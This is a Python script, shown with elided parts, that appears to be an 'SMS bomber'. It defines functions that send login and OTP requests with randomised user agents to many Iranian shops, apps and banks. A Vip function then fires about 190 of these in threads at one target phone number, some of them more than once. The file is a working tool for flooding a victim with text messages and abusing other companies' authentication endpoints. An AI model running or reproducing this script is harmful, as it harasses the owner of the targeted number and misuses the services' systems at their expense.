...
def digitoon(phone):
        ...
        rhead = {"user-agent": generate_user_agent()}
        try:
             post(url="https://apitwo.digitoon.ir/mobile_login_step1/8?dg_id=5FBFC23A" , json=n4, headers=rhead)
             return True
        except:
             pass
...
def emtiaz(phone):
    ...
    try:
        n4 = post(url="https://web.emtiyaz.app/json/login", headers=emH, data=emD,)
        print ("sended sms:)")
    except:
        print ("Error!")
...
def dayanshop(phone):
            ...
            rhead = {"user-agent": generate_user_agent()}
            try:
                post(url="https://dayanshop.com/Auth/CheckPhoneNumber", json=n4, headers=rhead)
                return True
            except:
                pass
...
def golsetan(phone):
        ...
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://www.golsetan.com/wp-json/panel/v1/auth/sendMobileAuth", json=n4, headers=rhead)
            return True
        except:
            pass
...
def is_phone(phone: str):
    ...
    return False
def Vip(phone, Time):
    Thread(target=snap, args=[phone]).start(), sleep(Time) #1
    Thread(target=gap, args=[phone]).start(), sleep(Time) #2
    Thread(target=tap30, args=[phone]).start(), sleep(Time) #3
    Thread(target=divar, args=[phone]).start(), sleep(Time) #4
    Thread(target=torob, args=[phone]).start(), sleep(Time) #5
    Thread(target=snapfood, args=[phone]).start(), sleep(Time) #6
    Thread(target=sheypoor, args=[phone]).start(), sleep(Time)  #7
    Thread(target=alibaba, args=[phone]).start(), sleep(Time) # 8
    Thread(target=smarket, args=[phone]).start(), sleep(Time) #9
    Thread(target=sTrip, args=[phone]).start(), sleep(Time) #10
    Thread(target=drdr, args=[phone]).start(), sleep(Time) #11
    Thread(target=filmnet, args=[phone]).start(), sleep(Time)  #12
    Thread(target=itool, args=[phone]).start(), sleep(Time)   #13
    Thread(target=anar, args=[phone]).start(), sleep(Time) #14
    Thread(target=azki, args=[phone]).start(), sleep(Time) #15
    Thread(target=nobat, args=[phone]).start(), sleep(Time) #16
    Thread(target=bn, args=[phone]).start(), sleep(Time) #17
    Thread(target=baskol, args=[phone]).start(), sleep(Time)  #18
    Thread(target=basalam, args=[phone]).start(), sleep(Time) #19
    Thread(target=ghabzino, args=[phone]).start(), sleep(Time) #20
    Thread(target=okorosh, args=[phone]).start(), sleep(Time) #21
    Thread(target=bimito, args=[phone]).start(), sleep(Time) #22
    Thread(target=gapfilm, args=[phone]).start(), sleep(Time) #23
    Thread(target=bimitoVip, args=[phone]).start(), sleep(Time)  # 24
    Thread(target=seebirani, args=[phone]).start(), sleep(Time) #25
    Thread(target=limome, args=[phone]).start(), sleep(Time) #26
    Thread(target=binjo, args=[phone]).start(), sleep(Time) #27
    Thread(target=kilid, args=[phone]).start(), sleep(Time) # 28
    Thread(target=didnegar, args=[phone]).start(), sleep(Time) #29
    Thread(target=olgoo, args=[phone]).start(), sleep(Time) # 30
    Thread(target=chmdon, args=[phone]).start(), sleep(Time) # 31
    Thread(target=drsaina, args=[phone]).start(), sleep(Time) # 32
    Thread(target=see5, args=[phone]).start(), sleep(Time) #33
    Thread(target=simkhanT, args=[phone]).start(), sleep(Time) #34
    Thread(target=simkhanF, args=[phone]).start(), sleep(Time) #35
    Thread(target=lendo, args=[phone]).start(), sleep(Time) #36
    Thread(target=pakhsh, args=[phone]).start(), sleep(Time) #37
    Thread(target=mihanpezeshk, args=[phone]).start(), sleep(Time) # 38
    Thread(target=mek, args=[phone]).start(), sleep(Time) #39
    Thread(target=okorosh, args=[phone]).start(), sleep(Time) #40
    Thread(target=behtarino, args=[phone]).start(), sleep(Time) #41
    Thread(target=abantether, args=[phone]).start(), sleep(Time) #42
    Thread(target=flightio, args=[phone]).start(), sleep(Time) #43
    Thread(target=pooleno, args=[phone]).start(), sleep(Time) #44
    Thread(target=arzinja, args=[phone]).start(), sleep(Time) #45
    Thread(target=rubika, args=[phone]).start(), sleep(Time) #46
    Thread(target=bama, args=[phone]).start(), sleep(Time) #47
    Thread(target=tex3, args=[phone]).start(), sleep(Time) #48
    Thread(target=wide, args=[phone]).start(), sleep(Time) #49
    Thread(target=digify, args=[phone]).start(), sleep(Time) #50
    Thread(target=arka, args=[phone]).start(), sleep(Time) #51
    Thread(target=bitbarg, args=[phone]).start(), sleep(Time) #52
    Thread(target=takshopaccessorise, args=[phone]).start(), sleep(Time) #53
    Thread(target=bitpin, args=[phone]).start(), sleep(Time) # 54
    Thread(target=pinket, args=[phone]).start(), sleep(Time) # 55
    Thread(target=shab, args=[phone]).start(), sleep(Time) # 56
    Thread(target=bit24, args=[phone]).start(), sleep(Time) # 57
    Thread(target=itoll, args=[phone]).start(), sleep(Time) # 58
    Thread(target=raybit, args=[phone]).start(), sleep(Time) # 59
    Thread(target=wis, args=[phone]).start(), sleep(Time) # 60
    Thread(target=digipay, args=[phone]).start(), sleep(Time)# 61
    Thread(target=farvi, args=[phone]).start(), sleep(Time) # 62
    Thread(target=taghche, args=[phone]).start(), sleep(Time) #
    Thread(target=namava, args=[phone]).start(), sleep(Time) # 63
    Thread(target=doctor, args=[phone]).start(), sleep(Time) # 64
    Thread(target=achar, args=[phone]).start(), sleep(Time) # 65
    Thread(target=a4baz, args=[phone]).start(), sleep(Time) # 66
    Thread(target=doctoreto, args=[phone]).start(), sleep(Time) # 67
    Thread(target=hyperjan, args=[phone]).start(), sleep(Time) # 68
    Thread(target=devslop, args=[phone]).start(), sleep(Time) # 69
    Thread(target=hiword, args=[phone]).start(), sleep(Time) # 70
    Thread(target=behzadshami, args=[phone]).start(), sleep(Time) # 71
    Thread(target=dicardo, args=[phone]).start(), sleep(Time) # 72
    Thread(target=ghasedak24, args=[phone]).start(), sleep(Time) # 73
    Thread(target=tikban, args=[phone]).start(), sleep(Time) # 74
    Thread(target=banankala, args=[phone]).start(), sleep(Time) # 75
    Thread(target=iranketab, args=[phone]).start(), sleep(Time) # 76
    Thread(target=ketabchi, args=[phone]).start(), sleep(Time) # 77
    Thread(target=offdecor, args=[phone]).start(), sleep(Time) # 78
    Thread(target=exo, args=[phone]).start(), sleep(Time) # 79
    Thread(target=shahrfarsh, args=[phone]).start(), sleep(Time) # 80 
    Thread(target=takfarsh, args=[phone]).start(), sleep(Time)  # 81
    Thread(target=beheshticarpet, args=[phone]).start(), sleep(Time) # 82
    Thread(target=khanoumi, args=[phone]).start(), sleep(Time) # 83
    Thread(target=rojashop, args=[phone]).start(), sleep(Time) # 84
    Thread(target=rokla, args=[phone]).start(), sleep(Time) # 85
    Thread(target=khodro45, args=[phone]).start(), sleep(Time) # 86
    Thread(target=cinematicket, args=[phone]).start(), sleep(Time) # 87
    Thread(target=pezeshket, args=[phone]).start(), sleep(Time) # 88
    Thread(target=virgool, args=[phone]).start(), sleep(Time) # 89
    Thread(target=timcheh, args=[phone]).start(), sleep(Time) #90
    Thread(target=helsa, args=[phone]).start(), sleep(Time) #91
    Thread(target=paklean, args=[phone]).start(), sleep(Time) #92
    Thread(target=mobogift, args=[phone]).start(), sleep(Time) #93
    Thread(target=iranicard, args=[phone]).start(), sleep(Time) #94
    Thread(target=pubgsell, args=[phone]).start(), sleep(Time) #95
    Thread(target=tj8, args=[phone]).start(), sleep(Time) #96
    Thread(target=kafegheymat, args=[phone]).start(), sleep(Time)  #97
    Thread(target=express, args=[phone]).start(), sleep(Time) #98
    Thread(target=delino, args=[phone]).start(), sleep(Time) #99
    Thread(target=alopeyk, args=[phone]).start(), sleep(Time) #100
    Thread(target=tamland, args=[phone]).start(), sleep(Time) #101
    Thread(target=opco, args=[phone]).start(), sleep(Time) #102
    Thread(target=digikalajet, args=[phone]).start(), sleep(Time) #103
    Thread(target=melix, args=[phone]).start(), sleep(Time) #104
    Thread(target=safiran, args=[phone]).start(), sleep(Time) #
    Thread(target=deyfriedchicken, args=[phone]).start(), sleep(Time) #105
    Thread(target=donergarden, args=[phone]).start(), sleep(Time) #106
    Thread(target=foodbell, args=[phone]).start(), sleep(Time) # 107
    Thread(target=foodiran16, args=[phone]).start(), sleep(Time) #108
    Thread(target=foodlandkish, args=[phone]).start(), sleep(Time) #109
    Thread(target=garcon, args=[phone]).start(), sleep(Time) #110
    Thread(target=gelatohouse, args=[phone]).start(), sleep(Time) #111
    Thread(target=mahiyekhoob, args=[phone]).start(), sleep(Time) #112
    Thread(target=nesengrill, args=[phone]).start(), sleep(Time) #113
    Thread(target=pirankalaco, args=[phone]).start(), sleep(Time) #114
    Thread(target=pizzapanjereh, args=[phone]).start(), sleep(Time) #115
    Thread(target=shandiz, args=[phone]).start(), sleep(Time) # 116
    Thread(target=tnovin, args=[phone]).start(), sleep(Time) #117
    Thread(target=dastkhat, args=[phone]).start(), sleep(Time) #118
    Thread(target=hamlex, args=[phone]).start(), sleep(Time) #119
    Thread(target=irwco, args=[phone]).start(), sleep(Time) #120
    Thread(target=moshaveran724, args=[phone]).start(), sleep(Time) #121
    Thread(target=sibbank, args=[phone]).start(), sleep(Time) #122
    Thread(target=snapp_link, args=[phone]).start(), sleep(Time) #123
    Thread(target=steelalborz, args=[phone]).start(), sleep(Time) #124
    Thread(target=miare, args=[phone]).start(), sleep(Time) #125
    Thread(target=arshiyan, args=[phone]).start(), sleep(Time) #126
    Thread(target=topnoor, args=[phone]).start(), sleep(Time) #127
    Thread(target=alinance, args=[phone]).start(), sleep(Time) #128
    Thread(target=alopeyk, args=[phone]).start(), sleep(Time) #129
    Thread(target=alopeyk_safir, args=[phone]).start(), sleep(Time) #130
    Thread(target=balad, args=[phone]).start(), sleep(Time) #131
    Thread(target=chaymarket, args=[phone]).start(), sleep(Time) #132
    Thread(target=coffefastfoodluxury, args=[phone]).start(), sleep(Time) #134
    Thread(target=dadhesab, args=[phone]).start(), sleep(Time) #135
    Thread(target=dosma, args=[phone]).start(), sleep(Time) #136
    Thread(target=foodcenter, args=[phone]).start(), sleep(Time) #137
    Thread(target=shop_mci, args=[phone]).start(), sleep(Time)  #138
    Thread(target=hamrahbours, args=[phone]).start(), sleep(Time) #139
    Thread(target=homtick, args=[phone]).start(), sleep(Time) #140
    Thread(target=iranamlaak, args=[phone]).start(), sleep(Time) #141
    Thread(target=karchidari, args=[phone]).start(), sleep(Time) #142
    Thread(target=kardoon, args=[phone]).start(), sleep(Time) #143
    Thread(target=dadpardaz, args=[phone]).start(), sleep(Time) #144
    Thread(target=mazoo, args=[phone]).start(), sleep(Time) #145
    Thread(target=dadpardaz, args=[phone]).start(), sleep(Time) #146
    Thread(target=ostadkr, args=[phone]).start(), sleep(Time) #147
    Thread(target=paymishe, args=[phone]).start(), sleep(Time) #148
    Thread(target=sizdah50, args=[phone]).start(), sleep(Time) #149
    Thread(target=zerocafe, args=[phone]).start(), sleep(Time) #150
    Thread(target=sizdah50, args=[phone]).start(), sleep(Time) #151
    Thread(target=podro, args=[phone]).start(), sleep(Time) #152
    Thread(target=sizdah50, args=[phone]).start(), sleep(Time) #153
    Thread(target=zerocafe, args=[phone]).start(), sleep(Time) #154
    Thread(target=rayshomar, args=[phone]).start(), sleep(Time) #155
    Thread(target=refahtea, args=[phone]).start(), sleep(Time) #156
    Thread(target=shahrhayejadid, args=[phone]).start(), sleep(Time) #157
    Thread(target=snapp_drivers, args=[phone]).start(), sleep(Time) #158
    Thread(target=mamifood, args=[phone]).start(), sleep(Time) #159
    Thread(target=uphone, args=[phone]).start(), sleep(Time) # 160
    Thread(target=abantether, args=[phone]).start(), sleep(Time) #161
    Thread(target=ashraafi, args=[phone]).start(), sleep(Time) #162
    Thread(target=bandarazad, args=[phone]).start(), sleep(Time) #163
    Thread(target=bazidone, args=[phone]).start(), sleep(Time) #164
    Thread(target=bigtoys, args=[phone]).start(), sleep(Time) #165
    Thread(target=bitex24, args=[phone]).start(), sleep(Time) #166
    Thread(target=candoosms, args=[phone]).start(), sleep(Time) #167
    Thread(target=glite, args=[phone]).start(), sleep(Time)  #168
    Thread(target=instagram, args=[phone]).start(), sleep(Time) #169
    Thread(target=hemat, args=[phone]).start(), sleep(Time) #170
    Thread(target=mipersia, args=[phone]).start(), sleep(Time) #171
    Thread(target=offch, args=[phone]).start(), sleep(Time) #172
    Thread(target=sibbazar, args=[phone]).start(), sleep(Time) #173
    Thread(target=raminashop, args=[phone]).start(), sleep(Time) #174
    Thread(target=sabziman, args=[phone]).start(), sleep(Time) #175
    Thread(target=sabziman, args=[phone]).start(), sleep(Time) #176
    Thread(target=zivanpet, args=[phone]).start(), sleep(Time) #177
    Thread(target=okala, args=[phone]).start(), sleep(Time) #178
    Thread(target=watchonline, args=[phone]).start(), sleep(Time) #179
    Thread(target=gharar, args=[phone]).start(), sleep(Time) #180
    Thread(target=bahram_shop, args=[phone]).start(), sleep(Time) #181
    Thread(target=pubisha, args=[phone]).start(), sleep(Time) #182
    Thread(target=mrbilit, args=[phone]).start(), sleep(Time) #183
    Thread(target=digistyle, args=[phone]).start(), sleep(Time) # 184
    Thread(target=mashinbank, args=[phone]).start(), sleep(Time) # 185
    Thread(target=irantic, args=[phone]).start(), sleep(Time) # 186
    Thread(target=givernfood, args=[phone]).start(), sleep(Time) # 187
    Thread(target=kodakamoz, args=[phone]).start(), sleep(Time) # 188
    Thread(target=ehteraman, args=[phone]).start(), sleep(Time) # 189
    Thread(target=shop_mci, args=[phone]).start(), sleep(Time) # 190
    Thread(target=hamrahbours, args=[phone]).start(), sleep(Time) #191
    Thread(target=amoomilad, args=[phone]).start(), sleep(Time) # 192
    Thread(target=farsgraphic, args=[phone]).start(), sleep(Time)  #193
    Thread(target=classino, args=[phone]).start(), sleep(Time) # 194
